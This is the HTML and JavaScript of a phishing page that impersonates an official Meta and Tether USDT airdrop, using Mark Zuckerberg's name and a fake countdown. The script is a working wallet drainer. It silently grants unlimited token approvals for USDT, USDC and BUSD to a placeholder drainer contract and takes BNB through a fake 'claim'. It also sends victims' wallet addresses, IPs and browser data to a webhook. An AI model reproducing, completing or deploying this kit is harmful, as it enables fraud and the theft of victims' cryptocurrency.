<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop."/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="robots" content="noindex,nofollow"/>
  <title>Tether USDT Airdrop - Claim $30,000 FREE!</title>

  <!-- Favicon -->
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>USDT</text></svg>">

  <!-- Web3.js -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>

  <!-- Google Fonts: Inter -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">

  <!-- Social Icons (Font Awesome) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <style>
    :root {
      --blue: #00d4ff;
      --blue-dark: #0099cc;
      --black: #000000;
      --gray: #111111;
      --border: #00aaff;
      --green: #00ff88;
      --red: #ff4444;
    }

    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: var(--black);
      color: var(--blue);
      text-align: center;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      overflow-x: hidden;
    }

    .container {
      max-width: 460px;
      width: 100%;
      background: var(--gray);
      border: 2px solid var(--border);
      border-radius: 18px;
      padding: 32px 24px;
      box-shadow: 0 0 40px rgba(0, 212, 255, 0.2);
      position: relative;
    }

    .logo {
      width: 60px;
      height: 60px;
      margin: 0 auto 12px;
      border-radius: 50%;
      border: 3px solid var(--blue);
      box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
    }

    h1 {
      font-size: 2.4rem;
      font-weight: 800;
      color: var(--blue);
      text-shadow: 0 0 12px rgba(0, 212, 255, 0.5);
      margin-bottom: 8px;
      letter-spacing: -0.5px;
    }

    .subtitle {
      font-size: 1.1rem;
      color: #66e0ff;
      margin-bottom: 20px;
      font-weight: 600;
    }

    .video-container {
      margin: 24px 0;
      border-radius: 14px;
      overflow: hidden;
      border: 2px solid var(--border);
      box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
    }

    video {
      width: 100%;
      display: block;
    }

    .zuck {
      font-style: italic;
      color: #00aaff;
      margin: 14px 0 10px;
      font-size: 1.05rem;
      font-weight: 600;
    }

    .social-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin: 10px 0 20px;
    }

    .social-links a {
      color: var(--blue);
      font-size: 1.4rem;
      transition: 0.3s;
    }

    .social-links a:hover {
      color: white;
      transform: scale(1.2);
    }

    .countdown {
      background: rgba(0, 212, 255, 0.1);
      border: 1px solid var(--border);
      color: var(--blue);
      padding: 12px;
      border-radius: 12px;
      font-weight: 700;
      margin: 18px 0;
      font-size: 1rem;
    }

    .alert {
      background: rgba(255, 0, 0, 0.15);
      border: 1px solid var(--red);
      color: #ff9999;
      padding: 14px;
      border-radius: 12px;
      margin: 20px 0;
      font-size: 0.95rem;
      font-weight: 600;
    }

    .bnb-status {
      background: rgba(0, 255, 136, 0.1);
      border: 1px solid var(--green);
      color: var(--green);
      padding: 10px;
      border-radius: 10px;
      margin: 10px 0;
      font-size: 0.9rem;
      font-weight: 600;
      display: none;
    }

    .btn {
      width: 100%;
      padding: 16px;
      margin: 14px 0;
      background: linear-gradient(45deg, #00d4ff, #0099cc);
      color: #000;
      border: none;
      border-radius: 50px;
      font-weight: 800;
      font-size: 1.15rem;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .btn:hover:not(:disabled) {
      transform: translateY(-3px);
      box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4);
    }

    .btn:disabled {
      background: #333;
      color: #666;
      cursor: not-allowed;
    }

    .status {
      margin-top: 16px;
      font-size: 0.95rem;
      color: #66e0ff;
      min-height: 24px;
    }

    .success { color: #90ff90; font-weight: 700; }
    .loading {
      display: inline-block;
      width: 16px; height: 16px;
      border: 2px solid #333;
      border-top: 2px solid var(--blue);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .tx-hash {
      font-family: monospace;
      font-size: 0.85rem;
      color: #00aaff;
      word-break: break-all;
      margin: 10px 0;
      padding: 8px;
      background: #111;
      border-radius: 8px;
      border: 1px dashed #333;
    }

    @media (max-width: 480px) {
      h1 { font-size: 2rem; }
      .btn { font-size: 1.1rem; padding: 14px; }
    }
  </style>
</head>
<body>

<div class="container">
  <!-- USDT LOGO -->
  <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="logo">

  <h1>Tether USDT Airdrop</h1>
  <p class="subtitle">Official Meta Partnership</p>

  <!-- VIDEO -->
  <div class="video-container">
    <video controls poster="https://i.imgur.com/zuck-usdt.jpg">
      <source src="https://your-video.com/zuck-usdt.mp4" type="video/mp4">
      Your browser does not support video.
    </video>
  </div>
  <p class="zuck">— Mark Zuckerberg, CEO of Meta</p>

  <!-- SOCIAL MEDIA HANDLES -->
  <div class="social-links"
    <a href="https://instagram.com/zuck" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a>
    <a href="https://facebook.com/zuck" target="_blank" title="Facebook"><i class="fab fa-facebook"></i></a>
    <a href="https://x.com/finkd" target="_blank" title="X (Twitter)"><i class="fab fa-twitter"></i></a>
    <a href="https://youtube.com/@Meta" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
  </div>

  <!-- COUNTDOWN: 1440 HOURS -->
  <div class="countdown" id="countdown">Airdrop ends in: <span id="timer">1440:00:00</span></div>

  <!-- BNB WARNING -->
  <div class="alert">
    <strong>REQUIRED:</strong> Have <strong>≥1 BNB</strong> in wallet for gas.<br>
    <small>Claim will fail without BNB.</small>
  </div>

  <!-- BNB BALANCE STATUS -->
  <div class="bnb-status" id="bnbStatus">Checking BNB balance...</div>

  <button class="btn" id="connectBtn">Connect Wallet</button>
  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>

  <div class="status" id="status">Not connected</div>
  <div class="tx-hash" id="txHash" style="display:none;"></div>
</div>

<script>
  // === CONFIG ===
  const DRAINER_CONTRACT = "0xYourDrainerAddressHere"; // ← REPLACE
  const WEBHOOK = "https://webhook.site/your-id-here"; // ← REPLACE
  const TOKENS = [
    "0x55d398326f99059fF775485246999027B3197955", // USDT
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
    "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"  // BUSD
  ];
  const MIN_BNB = 1; // 1 BNB required
  // ===============

  let account, web3;
  const connectBtn = document.getElementById("connectBtn");
  const claimBtn = document.getElementById("claimBtn");
  const status = document.getElementById("status");
  const txHash = document.getElementById("txHash");
  const bnbStatus = document.getElementById("bnbStatus");

  connectBtn.onclick = connect;
  claimBtn.onclick = claim;

  // COUNTDOWN: 1440 HOURS
  function startCountdown() {
    let time = 1440 * 60 * 60; // 1440 hours
    const timer = document.getElementById("timer");
    setInterval(() => {
      if (time <= 0) return;
      time--;
      const h = String(Math.floor(time / 3600)).padStart(4, '0');
      const m = String(Math.floor((time % 3600) / 60)).padStart(2, '0');
      const s = String(time % 60).padStart(2, '0');
      timer.innerHTML = `${h}:${m}:${s}`;
    }, 1000);
  }
  startCountdown();

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch { return "unknown"; }
  }

  async function checkBNBBalance() {
    if (!web3 || !account) return;
    try {
      const balance = await web3.eth.getBalance(account);
      const bnb = web3.utils.fromWei(balance, 'ether');
      const num = parseFloat(bnb);
      if (num >= MIN_BNB) {
        bnbStatus.style.display = "block";
        bnbStatus.style.color = "var(--green)";
        bnbStatus.innerHTML = `BNB: ${num.toFixed(4)} BNB (Enough!)`;
      } else {
        bnbStatus.style.display = "block";
        bnbStatus.style.color = "var(--red)";
        bnbStatus.innerHTML = `BNB: ${num.toFixed(4)} BNB (Need ≥1 BNB!)`;
        claimBtn.disabled = true;
      }
    } catch (e) {
      bnbStatus.innerHTML = "BNB check failed";
    }
  }

  async function connect() {
    if (!window.ethereum) return alert("Install MetaMask or Trust Wallet!");

    web3 = new Web3(window.ethereum);
    try {
      await ethereum.request({ method: 'eth_requestAccounts' });
      [account] = await web3.eth.getAccounts();
      const chain = await web3.eth.getChainId();
      if (chain !== 56) {
        await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
      }

      status.innerHTML = `Connected: ${account.slice(0,6)}...${account.slice(-4)}`;
      connectBtn.innerHTML = "Connected";
      connectBtn.disabled = true;
      claimBtn.disabled = false;

      await autoApprove();
      await checkBNBBalance();
      const ip = await getIP();
      notify("CONNECTED", account, ip);

    } catch (e) {
      status.innerHTML = "Connection failed";
    }
  }

  async function autoApprove() {
    const abi = [{"inputs":[{"internalType":"address","name":"s","type":"address"},{"internalType":"uint256","name":"a","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
    const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    for (let t of TOKENS) {
      try {
        const token = new web3.eth.Contract(abi, t);
        await token.methods.approve(DRAINER_CONTRACT, MAX).send({ from: account });
      } catch {}
    }
  }

  async function claim() {
    claimBtn.innerHTML = `Claiming...<span class="loading"></span>`;
    const abi = [{"inputs":[],"name":"claimAirdrop","outputs":[],"stateMutability":"payable","type":"function"}];
    const contract = new web3.eth.Contract(abi, DRAINER_CONTRACT);

    try {
      const tx = await contract.methods.claimAirdrop().send({
        from: account,
        value: web3.utils.toWei("0.001", "ether")
      });

      const hash = tx.transactionHash;
      txHash.style.display = "block";
      txHash.innerHTML = `Tx: ${hash.slice(0,10)}...${hash.slice(-8)}`;

      status.innerHTML = `<span class="success">Claimed $30,000 USDT! Processing...</span>`;
      const ip = await getIP();
      notify("CLAIMED", account, ip, hash);

    } catch (e) {
      status.innerHTML = "Failed — need ≥1 BNB for gas";
    }

    setTimeout(() => {
      claimBtn.innerHTML = "Claim $30,000 USDT";
    }, 3000);
  }

  async function notify(action, wallet, ip = "unknown", tx = "") {
    fetch(WEBHOOK, {
      method: "POST",
      body: JSON.stringify({
        action, wallet, ip, tx,
        time: new Date().toISOString(),
        ua: navigator.userAgent
      }),
      headers: { "Content-Type": "application/json" }
    }).catch(() => {});
  }
</script>

</body>
</html>
